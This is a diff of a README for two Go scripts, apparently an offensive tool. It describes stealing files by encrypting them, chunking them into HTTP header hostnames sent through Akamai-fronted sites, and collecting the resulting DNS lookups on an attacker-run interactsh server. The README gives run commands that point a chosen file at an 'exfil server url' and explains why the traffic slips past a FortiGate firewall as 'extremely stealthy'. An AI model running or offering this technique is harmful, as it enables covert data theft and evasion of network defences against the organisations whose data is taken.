@@ -5,23 +5,23 @@ I took their ideas and wrote two Go scripts that can be used for educational pur
 
 One script that encrypts and bounces the data you want to exfiltrate and the other that reassembles and decrypts it.
 
-You will need an OOB dns server under you're control for this to work and collect the data. Here I'm using https://github.com/projectdiscovery/interactsh
+You will need an OOB dns server under your control for this to work and to collect the data. Here I'm using https://github.com/projectdiscovery/interactsh
 
 From my testing this should work on most websites/domains that touches Akamai.
 
 ### Bounce.go
-This script reads your chosen domain names from domains.txt. First encrypts your chosen file using a password you provide, encodes the file into Base32 and finally splits it into 63 byte chunks and sends them as part of a domain name in an HTTP header.
+This script reads your chosen domain names from domains.txt. It first encrypts your chosen file using a password you provide, encodes the file into Base32 and finally splits it into 63 byte chunks and sends them as part of a domain name in an HTTP header.
 
 Example:
 ```
-go run bounce.go -f <filename> -p <password> -u <UUID> -e <interact server url> -v
+go run bounce.go -f <filename> -p <password> -u <UUID> -e <exfil server url> -v
 ```
 ```
-.\bounce.exe -f <filename> -p <password> -u <UUID> -e <interact server url> -v
+.\bounce.exe -f <filename> -p <password> -u <UUID> -e <exfil server url> -v
 ```
 
 ### Regenerate.go
-This script reads the JSON output from your interactsh exfil server, processes and reassembles the chunks and does the reverse of decoding, decrypting, and finally outputting the file.
+This script reads the JSON export from your interactsh exfil server, processes and reassembles the chunks, doing the reverse by decoding, decrypting, and finally outputting the file.
 
 Example:
 ```
@@ -51,6 +51,6 @@ Example of the forward traffic from FortiGate:
 
 - As you can see, it looks like the traffic is going to 23.x.x.x, a highly trusted domain.
 - However, when the HTTP request is made, the webserver looks at our modified HTTP headers and does a dns lookup of our exfil server from those headers.
-- Then we're able to collect each of those dns lookups back to our exfil server and reconstruct the data from those headers.
-- This only works because many webservers processes hostnames in the headers, and we can relay small chunks of data in those headers for collection.
-- Therefore, this makes it an extremely stealthy way of exfiltrating data.
+- Then we're able to collect each of those dns lookups to our exfil server and reconstruct the data from these headers.
+- This only works because many webservers processes hostnames in the headers, and we can relay small chunks of data in those very same headers between endpoints.
+- Therefore, this makes it an extremely stealthy way of exfiltrating data albeit a slow one.
